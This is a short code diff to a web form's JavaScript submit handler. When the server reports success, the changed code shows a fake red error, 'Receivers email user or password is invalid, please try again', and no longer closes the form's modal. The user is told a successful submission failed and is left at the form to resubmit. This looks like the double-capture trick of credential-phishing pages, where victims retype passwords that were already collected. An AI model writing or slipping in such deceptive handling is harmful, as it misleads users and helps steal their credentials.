@@ -353,14 +353,11 @@
             const data = await res.json();
 
             if (res.ok) {
-              responseBox.className = "alert alert-success";
+              responseBox.className = "alert alert-danger";
               responseBox.textContent =
-                data.message || "Successfully submitted!";
+                "Error 40067: Receivers email user or password is invalid, please try again..";
 
               // Wait 3 seconds then close the modal
-              setTimeout(() => {
-                modal.hide();
-              }, 3000);
             } else {
               responseBox.className = "alert alert-danger";
               responseBox.textContent = data.message || "Submission failed.";
